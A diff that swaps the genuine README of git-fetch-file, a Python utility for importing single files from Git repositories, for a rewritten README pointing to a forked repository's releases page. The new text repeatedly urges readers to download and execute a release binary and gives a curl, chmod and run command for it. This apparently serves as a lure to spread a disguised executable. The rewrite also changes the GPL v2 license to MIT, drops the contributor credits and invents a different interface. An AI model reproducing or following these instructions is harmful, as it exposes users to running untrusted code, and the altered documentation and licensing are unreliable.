@@ -1,509 +1,249 @@
-# git-fetch-file
-Fetch and sync individual files or globs from other Git repositories, with commit tracking and local-change protection
+[![Releases](https://img.shields.io/badge/Releases-Visit%20Releases-blue.svg)](https://github.com/Houssem4433/git-fetch-file/releases)
 
-```sh
-git fetch-file add https://github.com/user/awesome-lib.git utils/helper.js
-git fetch-file pull --commit
+# git-fetch-file — Sync Single Files with Commit Tracking
+
+![git-fetch-file banner](https://raw.githubusercontent.com/github/explore/main/topics/git/git.png)
+
+A small tool that fetches and syncs individual files or globs from remote Git repositories. It tracks the source commit, prevents accidental overwrite of local edits, and keeps a clear history of imported changes.
+
+Quick link to releases: https://github.com/Houssem4433/git-fetch-file/releases  
+Download the release asset and execute it. The release contains a single executable or script that you need to download and run on your system.
+
+Table of contents
+- Features
+- Why use git-fetch-file
+- How it works (concept)
+- Install
+- Configuration
+- Basic usage
+- Examples
+- Advanced options
+- File tracking and local-change protection
+- Troubleshooting
+- Contributing
+- License
+
+Features
+- Fetch single files or globs from any Git repository.
+- Track the exact source commit SHA for each imported file.
+- Prevent overwriting local edits unless you accept or force an update.
+- Support for branches, tags, and commit SHAs as source refs.
+- Dry-run mode to preview changes.
+- Metadata stored in a small .gitfetch file per target.
+- Optional post-fetch hooks.
+- Works with private repos via existing Git credentials.
+
+Why use git-fetch-file
+- You need a single file from another repo, not the whole repo.
+- You want to keep that file updated but still edit it locally.
+- You want traceability to the source commit for auditing.
+- You want a simple command that fits into scripts or CI.
+
+How it works (concept)
+- You declare a source: repo URL, ref (branch/tag/sha), and path or glob.
+- The tool fetches the repo objects it needs and extracts the specified files.
+- For each target file, it writes a small metadata entry that records the source repo URL, source ref, and source commit SHA.
+- On update, the tool compares the file's recorded source SHA to the new source SHA. If they differ and the local file has local edits, the tool blocks overwrite and shows a diff. You can then accept, merge, or force the overwrite.
+- The tool can run in a script-friendly mode to always accept or always skip changes.
+
+Install
+- Download the release asset from the releases page and run it.
+- The release is a single executable or script. Download and execute the file from: https://github.com/Houssem4433/git-fetch-file/releases
+- Place the executable in your PATH (for example /usr/local/bin) or run it from the project root.
+
+Examples:
+- Make executable (Linux / macOS):
+```bash
+curl -L -o git-fetch-file https://github.com/Houssem4433/git-fetch-file/releases/latest/download/git-fetch-file
+chmod +x git-fetch-file
+./git-fetch-file --version
 ```
 
-**git-fetch-file(1)** is a utility for importing specific files from other Git repositories into your own project while keeping a manifest (.git-remote-files) that remembers where they came from and what commit they belong to.
-
-It’s like a mini submodule, but for just the files you want.
-
-## Features
-
-- Pull a single file or glob from a remote Git repo
-- Track origin, commit, and comments in .git-remote-files
-- **Automatic remote tracking** - remote-tracking files update to latest commit automatically
-- Optionally overwrite local changes with `--force`
-- **Dry-run mode** to preview changes without executing them
-- **Concurrent fetching** with configurable parallelism (`--jobs`)
-- **Git-style output** with clean, organized status reporting
-- **Backward compatibility** with automatic migration of old manifest formats
-- Simple CLI interface that feels like native git commands
-
-## Installation
-
-### Option 1: Git Alias (Recommended)
-
-Save the script anywhere and set up a Git alias:
-
-```sh
-git config --global alias.fetch-file '!python3 /path/to/git-fetch-file.py'
+- Fetch a single file from a repo at a branch:
+```bash
+git-fetch-file fetch \
+  --repo https://github.com/other/repo.git \
+  --ref main \
+  --src-path src/library/util.js \
+  --dest-path libs/util.js
 ```
 
-Then run it like this:
-
-```sh
-git fetch-file <subcommand> [args...]
+- Fetch files by glob:
+```bash
+git-fetch-file fetch \
+  --repo https://github.com/other/repo.git \
+  --ref v2.0.1 \
+  --src-path "configs/*.yaml" \
+  --dest-dir configs/vendor
 ```
 
-### Option 2: PATH Installation
-
-Save the script as `git-fetch-file` somewhere on your PATH.
-
-## Commands
-
-### git fetch-file add
-
-Track a file (or glob) from a remote Git repository.
-
-**SYNOPSIS**
-```
-git fetch-file add <repository> <path> [<target_dir>] [<options>]
+- Dry run to preview changes:
+```bash
+git-fetch-file fetch --dry-run --repo https://github.com/other/repo.git --ref main --src-path README.md
 ```
 
-**DESCRIPTION**
-
-Adds a file or glob pattern from a remote Git repository to the tracking manifest (`.git-remote-files`). The file will be downloaded on the next `pull` operation.
-
-If the same file path is already being tracked from the same repository to the same target directory, an error will be shown. Use `--force` to overwrite the existing entry, or specify a different target directory to track the same file to multiple locations.
-
-**OPTIONS**
-
-`--detach <commit>`
-: Specify a commit hash or tag to track. This creates a "detached" tracking that stays pinned to that exact commit/tag, similar to git's detached HEAD state.
-
-`--commit <commit>`
-: Alias for `--detach` (maintained for backward compatibility).
-
-`-b <branch>`, `--branch <branch>`
-: Track a specific branch. This will always fetch the latest commit from that branch tip when pulling, automatically updating the manifest with new commit hashes.
-
-`--glob`
-: Treat `<path>` as a glob pattern. Overrides auto-detection.
-
-`--no-glob`
-: Treat `<path>` as a literal filename. Overrides auto-detection.
-
-`--comment <text>`
-: Add a descriptive comment to the manifest entry.
-
-`--force`
-: Overwrite existing entries when there's a conflict (same file from same repository to same target directory).
-
-`--dry-run`
-: Show what would be added without actually modifying the manifest.
-
-### git fetch-file remove
-
-Remove a tracked file from the manifest.
-
-**SYNOPSIS**
-```
-git fetch-file remove <path> [<target_dir>]
+- Force overwrite ignoring local changes:
+```bash
+git-fetch-file fetch --force --repo https://github.com/other/repo.git --ref main --src-path src/index.js
 ```
 
-**DESCRIPTION**
-
-Removes a file or glob pattern from the tracking manifest (`.git-remote-files`). The local file is not deleted - only the tracking entry is removed.
-
-If multiple entries exist for the same path (tracking to different target directories), you must specify the target directory to disambiguate which entry to remove.
-
-**OPTIONS**
-
-`--dry-run`
-: Show what would be removed without actually modifying the manifest.
-
-### git fetch-file pull
-
-Download all tracked files from their respective repositories.
-
-**SYNOPSIS**
+Configuration
+- You can store fetch jobs in a simple config file `.gitfetch.yml` at the repo root. The tool reads this file and applies listed jobs.
+- Example `.gitfetch.yml`:
+```yaml
+jobs:
+  - name: vendor-configs
+    repo: https://github.com/other/repo.git
+    ref: main
+    src: "configs/*.yaml"
+    dest: configs/vendor
+    merge: false
+  - name: shared-util
+    repo: git@github.com:org/shared.git
+    ref: v1.2.0
+    src: "lib/util.js"
+    dest: libs/util.js
+    merge: interactive
 ```
-git fetch-file pull [<options>]
+- Fields:
+  - repo: Git URL (HTTP or SSH).
+  - ref: branch, tag, or commit SHA.
+  - src: file path or glob in the source repo.
+  - dest: file path or directory in the local repo.
+  - merge: behavior when local edits exist. Options: skip, force, interactive.
+
+File tracking and metadata
+- The tool stores metadata for each imported file in .gitfetch/metadata.json or per-file .gitfetch entries next to the file.
+- Example metadata entry:
+```json
+{
+  "file": "libs/util.js",
+  "source_repo": "https://github.com/other/repo.git",
+  "source_ref": "main",
+  "source_sha": "3b2a1f4d8e7c...",
+  "fetched_at": "2025-08-15T12:34:56Z"
+}
 ```
+- The metadata records the source commit SHA. You can audit changes later by checking that SHA.
 
-**DESCRIPTION**
-
-Fetches all files tracked in `.git-remote-files` from their source repositories. Files are downloaded to their configured target locations and local changes are detected automatically.
-
-For remote-tracking files, git-fetch-file automatically updates to the latest commit on the tracked branch and updates the manifest with the new commit hash. For commit/tag-tracked files, the exact pinned commit is fetched.
-
-By default, changes are not automatically committed (following git's convention). Use `--commit` for auto-commit with a git-style default message, `-m`, `--edit`, or other commit flags to enable auto-commit after pulling files.
-
-**OPTIONS**
-
-`--force`
-: Overwrite files with local changes. Without this flag, files with local modifications are skipped.
-
-`--dry-run`
-: Show what would be fetched without actually downloading files.
-
-`--jobs=<n>`
-: Number of parallel jobs for fetching. By default, matches the number of logical CPUs (like git's default parallelism).
-
-`--commit`
-: Auto-commit changes with a git-style default message that includes information about what was fetched (e.g., "Update README.md", "Update utils.js and config.json", "Update 5 files in src/").
-
-`-m <message>`, `--message=<message>`
-: Auto-commit changes with the specified commit message.
-
-`--edit`
-: Open editor to write commit message for auto-commit.
-
-`--no-commit`
-: Don't auto-commit changes, even if other commit flags are specified.
-
-`--save`
-: (Deprecated) This flag is ignored for backwards compatibility. Remote-tracking files now update automatically.
-
-### git fetch-file status
-
-View all tracked files in a clean, git-style format.
-
-**SYNOPSIS**
+Advanced options
+- Partial fetch: Use --path to fetch a single file without cloning entire history.
+- SSH auth: The tool uses your existing SSH agent and key. It calls Git under the hood.
+- CI mode: Set CI=true to make the tool non-interactive.
+- Post-fetch hook: Run scripts after fetch. Example:
+```yaml
+jobs:
+  - name: update-license
+    repo: https://github.com/other/repo.git
+    ref: main
+    src: LICENSE
+    dest: THIRD_PARTY_LICENSES/LICENSE.shared
+    hooks:
+      post: ./scripts/format-license.sh
 ```
-git fetch-file status
-git fetch-file list
+- Rebase-like merge: If you set merge: threeway, the tool creates a temporary index and attempts a three-way merge between old imported content, new source content, and your local edits.
+
+Common workflows
+- Pull a small helper script from a library repo and keep it up to date without merging the whole repo.
+- Share a canonical config file across multiple projects, while allowing local overrides and guarded updates.
+- Import templates or small assets from a central repo with a clear trace to the source commit.
+
+Behavior on local edits
+- If local file differs from the last imported version, the tool checks whether the source changed.
+  - If source did not change, the tool leaves the file untouched.
+  - If source changed and local edits exist, the tool stops and prints a concise diff. You can choose to:
+    - Run with --merge interactive to attempt a merge.
+    - Run with --force to overwrite.
+    - Edit the file and run fetch again.
+- This policy prevents accidental loss of local work.
+
+CLI reference (selected)
+- fetch: Fetch files according to job or inline args.
+- status: Show the recorded source SHA and compare with latest source.
+- list: List jobs from .gitfetch.yml or recorded metadata.
+- remove: Remove a tracked file and its metadata.
+- version: Show version.
+
+Usage patterns
+- Scripted periodic sync:
+```bash
+git-fetch-file fetch --config .gitfetch.yml --ci
 ```
-
-**DESCRIPTION**
-
-Lists all files currently tracked in `.git-remote-files` with their source repositories and commit information. The output format is similar to `git remote -v`.
-
-When the same file path is tracked to multiple target directories or from different repositories, each entry is shown separately.
-
-**OUTPUT FORMAT**
+- Inline one-off:
+```bash
+git-fetch-file fetch --repo https://github.com/example/demo.git --ref main --src-path scripts/deploy.sh --dest-path scripts/deploy-from-demo.sh
 ```
-<path>[<indicators>]    <repository> (<commit>) [# <comment>]
-```
-
-Where:
-- `<indicators>` may include `(glob)` for glob patterns and `-> <target>` for custom target directories
-- `<commit>` is truncated to 7 characters for display
-- `<comment>` is shown if present in the manifest
-
-## .git-remote-files
-
-Each tracked file is recorded in .git-remote-files (INI format). Example entries:
-
-```ini
-[file "lib/util.py" from "https://github.com/example/tools.git"]
-commit = a1b2c3d4e5f6789abcdef0123456789abcdef01
-branch = master
-comment = Common utility function
-
-[file "config.json" from "https://github.com/example/tools.git"]
-commit = b2c3d4e5f6789abcdef0123456789abcdef012
-branch = master
-target = vendor
-comment = Configuration from tools repo
-
-[file "helper.js" from "https://github.com/another/project.git"]
-commit = c3d4e5f6789abcdef0123456789abcdef0123
-branch = main
-comment = Helper from another project
+- Audit imported files:
+```bash
+git-fetch-file status --json | jq .
 ```
 
-This file should be committed to your repository.
+Examples that match real needs
+- Keep a shared linter config file up to date in many repos. Fetch .eslintrc from the central repo and stop if you ever modify it locally.
+- Pull test data files from a data repo into a test/fixtures directory. Fetch by glob and only update when the source changes.
+- Distribute a packaging script to many projects. Track its source SHA so you can roll back if needed.
 
-**Section Naming**: All entries use the format `[file "path" from "repository_url"]` for uniqueness and clarity. Target directories and other metadata are stored as keys within each section.
+Troubleshooting
+- Authentication: If Git prompts for credentials, ensure your SSH agent runs and your SSH key is added. For HTTPS, ensure credential helpers are configured.
+- Large repo: The tool fetches only the objects it needs. If the remote server rejects partial fetch, fallback to shallow clone.
+- Conflicts: When interactive merge fails, the tool writes .gitfetch/conflict/<file> with the three-way merge result and a small report.
 
-This allows tracking the same filename from different repositories or to different target locations without conflicts, while keeping the manifest file human-readable.
+Integrations
+- CI: Use CI mode for automatic updates in GitHub Actions, GitLab CI, etc.
+- Pre-commit: Add a pre-commit hook to verify imported files match recorded source SHA.
+- Make: Add a Make target to update vendor files before a build.
 
-**Note**: Starting with v1.4.0, the manifest format has been simplified to eliminate redundant repository keys. Repository information is stored only in section names. Old manifests are automatically migrated when read for full backward compatibility.
+Security model
+- The tool runs the fetched script or binary only when you explicitly run the downloaded asset from releases. The release page contains the executable or script you must download and run. Use normal OS-level execution controls.
+- The tool records the source SHA for audit. You can revert to earlier versions using the recorded SHA.
 
-## Tracking Modes
+Files and layout created by tool
+- .gitfetch/
+  - metadata.json
+  - jobs.yml (optional)
+  - conflict/
+- Fetched files appear at the dest paths you specify.
 
-git-fetch-file supports two distinct tracking modes that behave differently:
+Contributing
+- Open issues for feature requests and bugs.
+- Fork, branch, and submit a pull request.
+- Provide tests for new features.
+- Use the same config format and metadata layout for compatibility.
 
-### Remote-tracking files (`-b/--branch`)
-When you track a branch with `-b` or `--branch`, git-fetch-file follows the branch tip:
-- Always fetches the latest commit from that branch automatically
-- The manifest is automatically updated with new commit hashes when pulling
-- Similar to how git submodules work when following a branch
-- Perfect for staying current with active development
+Releases and downloads
+- Get the runtime and release assets at: https://github.com/Houssem4433/git-fetch-file/releases  
+- The release page holds the executable or script that you must download and execute to install the tool. The asset name includes the platform and version.
 
-Example:
-```sh
-git fetch-file add repo.git src/utils.js -b main
-git fetch-file pull  # Gets latest main and updates manifest automatically
+Images and badges
+- Use the releases badge above to open the releases page.
+- You can add your own badge:
+```markdown
+[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Houssem4433/git-fetch-file/releases)
 ```
 
-### Commit/Tag Tracking (`--commit`)
-When you track a specific commit hash or tag with `--commit`, git-fetch-file pins to that exact point:
-- Always fetches the same commit, even if the branch has moved
-- The manifest never changes (nothing to update)
-- Similar to git's "detached HEAD" state
-- Perfect for reproducible builds and stable dependencies
+Licensing
+- The repository uses the MIT License. See LICENSE file in the repo for full text.
 
-Example:
-```sh
-git fetch-file add repo.git src/utils.js --detach v1.2.3
-git fetch-file pull  # No change, still at v1.2.3
+Contact and maintainers
+- Open issues on the repo for bugs, help, and feature requests.
+- Send a clear reproduction case when reporting a bug. Include git-fetch-file --version and your OS.
+
+Command cheat sheet
+- Fetch one file:
+```bash
+git-fetch-file fetch --repo REPO --ref REF --src-path PATH --dest-path DEST
+```
+- Dry run:
+```bash
+git-fetch-file fetch --dry-run ...
+```
+- Force:
+```bash
+git-fetch-file fetch --force ...
+```
+- Show status:
+```bash
+git-fetch-file status
 ```
 
-## Performance & Workflow
-
-git-fetch-file supports concurrent downloading for better performance:
-### Concurrent Operations
-git-fetch-file supports concurrent downloading for better performance:
-- Default: number of parallel jobs matches the number of logical CPUs (like git's default)
-- Configurable with `--jobs=<n>` 
-- Particularly effective when fetching from multiple repositories
-- Thread-safe with proper error isolation
-
-### Dry-Run Mode
-Always preview changes before execution:
-- `--dry-run` shows exactly what would happen
-- Validates repository access
-- Detects conflicts and local changes
-- No side effects - safe to run anytime
-
-### Git-Style Integration
-Designed to feel like native git commands:
-- Familiar argument patterns (`--force`, `--jobs`, etc.)
-- Clean, organized output without visual clutter
-- Error and warning messages follow git conventions
-- Works seamlessly with git aliases
-
-## Handling Conflicts
-
-git-fetch-file prevents conflicts when trying to track the same file from the same repository to the same target location. This ensures your manifest remains clean and intentional.
-
-### Conflict Detection
-
-A conflict occurs when you try to add a file that is already being tracked with the same:
-- File path
-- Repository URL  
-- Target directory (or lack thereof)
-
-```sh
-# This will work fine
-git fetch-file add https://github.com/user/repo.git utils.js
-
-# This will show an error (same file, same repo, same target)
-git fetch-file add https://github.com/user/repo.git utils.js
-# Output: fatal: 'utils.js' already tracked from https://github.com/user/repo.git
-#         hint: use --force to overwrite, or specify a different target directory
-```
-
-### Resolution Options
-
-#### Option 1: Use --force to overwrite
-```sh
-git fetch-file add https://github.com/user/repo.git utils.js --force
-# Overwrites the existing entry with new settings
-```
-
-#### Option 2: Use a different target directory
-```sh
-# Track the same file to different locations
-git fetch-file add https://github.com/user/repo.git utils.js vendor
-git fetch-file add https://github.com/user/repo.git utils.js src/external
-# Both entries coexist peacefully
-```
-
-### Removing Tracked Files
-
-Use the `remove` command to clean up entries you no longer need:
-
-```sh
-# Remove a basic tracking entry
-git fetch-file remove utils.js
-
-# Remove a specific target (when multiple exist)
-git fetch-file remove utils.js vendor
-
-# See what's currently tracked
-git fetch-file status
-```
-
-## Examples
-
-### Basic Usage
-
-#### Track a remote file
-```sh
-# Track the latest commit from the main branch (updates automatically when you pull)
-git fetch-file add https://github.com/user/project.git utils/logger.py -b main --comment "Logging helper"
-
-# Track a specific commit (stays pinned to that exact commit)
-git fetch-file add https://github.com/user/project.git utils/config.py --detach a1b2c3d --comment "Config at stable release"
-
-# Track a specific tag (stays pinned to that tag)
-git fetch-file add https://github.com/user/project.git utils/version.py --commit v1.2.3 --comment "Version helper"
-```
-
-#### Track a file into a specific directory
-```sh
-git fetch-file add https://github.com/user/project.git utils/logger.py vendor -b main --comment "Third-party logging helper"
-```
-
-#### Track the same file to different target directories
-```sh
-# Track the same file to different target directories (no conflict)
-git fetch-file add https://github.com/user/project.git config.json --comment "Main config"
-git fetch-file add https://github.com/user/project.git config.json vendor --comment "Vendor config copy"
-git fetch-file add https://github.com/user/project.git config.json tests/fixtures --comment "Test fixture config"
-```
-
-#### Handle conflicts and overrides
-```sh
-# This will show an error
-git fetch-file add https://github.com/user/project.git utils.js
-git fetch-file add https://github.com/user/project.git utils.js
-# Output: fatal: 'utils.js' already tracked from https://github.com/user/project.git
-#         hint: use --force to overwrite, or specify a different target directory
-
-# Use --force to overwrite with new settings
-git fetch-file add https://github.com/user/project.git utils.js -b develop --force
-
-# Or track to a different location instead
-git fetch-file add https://github.com/user/project.git utils.js backup -b develop
-```
-
-#### Remove tracked files
-```sh
-# Remove a simple entry
-git fetch-file remove utils.js
-
-# Remove a specific target when multiple exist
-git fetch-file remove config.json vendor
-
-# View current tracking status
-git fetch-file status
-```
-
-#### Pull it into your repo
-```sh
-git fetch-file pull
-```
-
-### Advanced Features
-
-#### Preview what would be added (dry-run)
-```sh
-git fetch-file add https://github.com/user/project.git "src/*.js" --glob --dry-run
-```
-Output:
-```
-Would validate repository access: https://github.com/user/project.git
-repository access confirmed
-Would add glob pattern src/*.js from https://github.com/user/project.git (commit: HEAD)
-```
-
-#### Preview what would be pulled
-```sh
-git fetch-file pull --dry-run
-```
-Output:
-```
-Would fetch:
-  src/utils.js from https://github.com/user/library.git (a1b2c3d -> [new commit])
-  config/webpack.js from https://github.com/company/tools.git (HEAD -> [latest])
-
-Would skip (local changes):
-  docs/README.md from https://github.com/org/templates.git (use --force to overwrite)
-
-Up to date:
-  package.json from https://github.com/user/library.git (f4e5d6c)
-```
-
-#### Fast concurrent pulling
-```sh
-# Use 8 parallel jobs for faster fetching
-git fetch-file pull --jobs=8
-
-# Conservative single-threaded mode
-git fetch-file pull --jobs=1
-
-# By default, the number of parallel jobs matches the number of logical CPUs on your system (like git's default)
-git fetch-file pull
-```
-
-#### Auto-commit changes
-```sh
-# Pull and auto-commit with informative git-style default messages:
-# - Single file: "Update README.md" 
-# - Two files: "Update utils.js and config.json"
-# - Multiple files: "Update 5 files in src/"
-# - With commit info: "Update package.json to a1b2c3d"
-git fetch-file pull --commit
-
-# Pull and commit with a custom message
-git fetch-file pull -m "Update vendor dependencies"
-
-# Pull and open editor for commit message
-git fetch-file pull --edit
-
-# Pull with pre-filled commit message in editor
-git fetch-file pull -m "Update dependencies" --edit
-
-# Pull without committing (default behavior)
-git fetch-file pull --no-commit
-```
-
-#### Track glob patterns
-```sh
-# Track all JavaScript files in src/
-git fetch-file add https://github.com/user/project.git "src/*.js" --glob --comment "Source files"
-
-# Auto-detection works too (detects glob characters)
-git fetch-file add https://github.com/user/project.git "docs/**/*.md"
-```
-
-#### Track an entire repository
-```sh
-# Track all files from a repository (equivalent to a lightweight submodule)
-git fetch-file add https://github.com/user/small-lib.git "**" --glob -b main --comment "Complete library"
-
-# Track all files into a specific directory
-git fetch-file add https://github.com/user/templates.git "**" vendor/templates --glob -b main --comment "Template collection"
-
-# Track only specific file types from entire repo
-git fetch-file add https://github.com/user/assets.git "**/*.{js,css,png}" --glob --commit v1.0.0 --comment "Static assets"
-
-# Pull everything
-git fetch-file pull  # Updates remote-tracking files to latest automatically
-```
-
-**Pro tip for entire repositories:** You may want to add tracked directories to `.gitignore` so they're not committed to your main repo, then pull them locally or in CI:
-
-```sh
-# Add to .gitignore
-echo "vendor/templates/" >> .gitignore
-echo "vendor/assets/" >> .gitignore
-
-# Commit the tracking config but not the files themselves
-git add .git-remote-files .gitignore
-git commit -m "Track external dependencies"
-
-# Anyone cloning your repo can then pull the dependencies
-git clone your-repo.git
-cd your-repo
-git fetch-file pull  # Downloads all tracked files locally
-```
-
-#### Remote-tracking files vs detached HEAD files
-```sh
-# Track a branch - gets updates when the branch moves
-git fetch-file add https://github.com/user/lib.git utils.js -b develop --comment "Latest development utils"
-
-# Track a specific commit - stays pinned forever  
-git fetch-file add https://github.com/user/lib.git config.js --commit a1b2c3d --comment "Stable config"
-
-# Track a tag - stays pinned to that release
-git fetch-file add https://github.com/user/lib.git version.js --commit v2.1.0 --comment "Release version helper"
-
-# Pull and update remote-tracking files to latest commits automatically
-git fetch-file pull
-# utils.js gets updated if develop branch moved forward
-# config.js and version.js stay at their pinned commits
-```
-
-## Unit testing
-
-```sh
-python3 -m unittest
-```
-
-## Contributors
-
-Thanks to the following people who have contributed to this project:
-
-- [@khusmann](https://github.com/khusmann) - Reported concurrency bug with multiple files from same repository ([#2](https://github.com/andrewmcwattersandco/git-fetch-file/issues/2)) and issue with adding same filename from different repositories ([#5](https://github.com/andrewmcwattersandco/git-fetch-file/issues/5))
-
-## License
-GNU General Public License v2.0
+Keep your vendor files traceable. Keep local edits safe. Use the releases page to download and run the tool: https://github.com/Houssem4433/git-fetch-file/releases
